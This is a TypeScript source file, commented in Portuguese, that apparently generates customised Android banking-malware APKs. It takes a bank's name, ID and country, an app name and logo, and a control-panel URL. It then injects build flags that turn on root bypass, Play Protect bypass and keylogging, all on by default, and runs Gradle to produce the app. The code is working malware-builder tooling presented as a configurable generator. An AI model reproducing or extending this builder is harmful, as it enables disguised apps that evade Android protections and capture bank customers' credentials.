import fs from 'fs';
import path from 'path';
import { execSync } from 'child_process';
import os from 'os';

/**
 * Gera APK customizado com build local via Gradle
 * Injeta dinamicamente: enableRootBypass, enablePlayProtectBypass, enableKeylogCapture
 */
export async function generateAPK(options: {
  appName: string;
  packageName: string;
  versionName: string;
  versionCode: number;
  logoUrl?: string;
  panelUrl: string;
  bankId: string;
  bankCountry: string;
  bankName: string;
  enableRootBypass?: boolean;
  enablePlayProtectBypass?: boolean;
  enableKeylogCapture?: boolean;
}): Promise<Buffer> {
  const sourceAndroidPath = path.join(process.cwd(), 'android', 'RemoteMonitorTest');
  
  if (!fs.existsSync(sourceAndroidPath)) {
    throw new Error(`Projeto Android não encontrado em ${sourceAndroidPath}`);
  }

  // Criar diretório temporário para build
  const tempBuildDir = fs.mkdtempSync(path.join(os.tmpdir(), 'apk-build-'));
  
  try {
    console.log(`[APK Generator] Preparando build em ${tempBuildDir}`);
    
    // Copiar projeto Android para temp
    copyDirRecursive(sourceAndroidPath, tempBuildDir);
    
    // Modificar build.gradle.kts com as flags customizadas
    const buildGradlePath = path.join(tempBuildDir, 'app', 'build.gradle.kts');
    modifyBuildGradle(buildGradlePath, options);
    
    // Executar build
    console.log('[APK Generator] Executando Gradle build...');
    const gradleCmd = process.platform === 'win32' 
      ? path.join(tempBuildDir, 'gradlew.bat')
      : path.join(tempBuildDir, 'gradlew');
    
    execSync(`${gradleCmd} assembleRelease`, {
      cwd: tempBuildDir,
      stdio: 'pipe',
    });
    
    // Encontrar APK gerado
    const apkPath = path.join(
      tempBuildDir, 
      'app', 
      'build', 
      'outputs', 
      'apk', 
      'release', 
      'app-release.apk'
    );
    
    if (!fs.existsSync(apkPath)) {
      throw new Error(`APK não encontrado em ${apkPath}`);
    }
    
    // Ler APK
    const apkBuffer = fs.readFileSync(apkPath);
    console.log(`[APK Generator] APK gerado com sucesso: ${apkBuffer.length} bytes`);
    
    return apkBuffer;
  } finally {
    // Limpar temp
    try {
      fs.rmSync(tempBuildDir, { recursive: true, force: true });
    } catch (e) {
      console.warn('[APK Generator] Erro ao limpar temp:', e);
    }
  }
}

/**
 * Copia diretório recursivamente
 */
function copyDirRecursive(src: string, dest: string) {
  if (!fs.existsSync(dest)) {
    fs.mkdirSync(dest, { recursive: true });
  }
  
  const entries = fs.readdirSync(src, { withFileTypes: true });
  for (const entry of entries) {
    const srcPath = path.join(src, entry.name);
    const destPath = path.join(dest, entry.name);
    
    if (entry.isDirectory()) {
      copyDirRecursive(srcPath, destPath);
    } else {
      fs.copyFileSync(srcPath, destPath);
    }
  }
}

/**
 * Modifica build.gradle.kts para injetar flags customizadas
 */
function modifyBuildGradle(
  buildGradlePath: string,
  options: {
    enableRootBypass?: boolean;
    enablePlayProtectBypass?: boolean;
    enableKeylogCapture?: boolean;
    [key: string]: any;
  }
) {
  let content = fs.readFileSync(buildGradlePath, 'utf-8');
  
  // Substituir/injetar buildConfigField dinamicamente
  const buildConfigFields = [
    `buildConfigField("Boolean", "ENABLE_ROOT_BYPASS", "${options.enableRootBypass ?? true}")`,
    `buildConfigField("Boolean", "ENABLE_PLAY_PROTECT_BYPASS", "${options.enablePlayProtectBypass ?? true}")`,
    `buildConfigField("Boolean", "ENABLE_KEYLOG_INJECTION", "${options.enableKeylogCapture ?? true}")`,
  ].join('\n        ');
  
  // Encontrar a seção de buildConfigField e substituir
  const buildConfigRegex = /buildConfigField\("Boolean", "ENABLE_ROOT_BYPASS".*?\n\s*buildConfigField\("Boolean", "ENABLE_KEYLOG_INJECTION"[^\n]*/s;
  
  if (buildConfigRegex.test(content)) {
    content = content.replace(buildConfigRegex, buildConfigFields);
  } else {
    // Se não existir, tentar adicionar após "versionName"
    content = content.replace(
      /(versionName = "[^"]*")/,
      `$1\n        ${buildConfigFields}`
    );
  }
  
  fs.writeFileSync(buildGradlePath, content, 'utf-8');
  console.log('[APK Generator] Flags customizadas injetadas no build.gradle.kts');
}
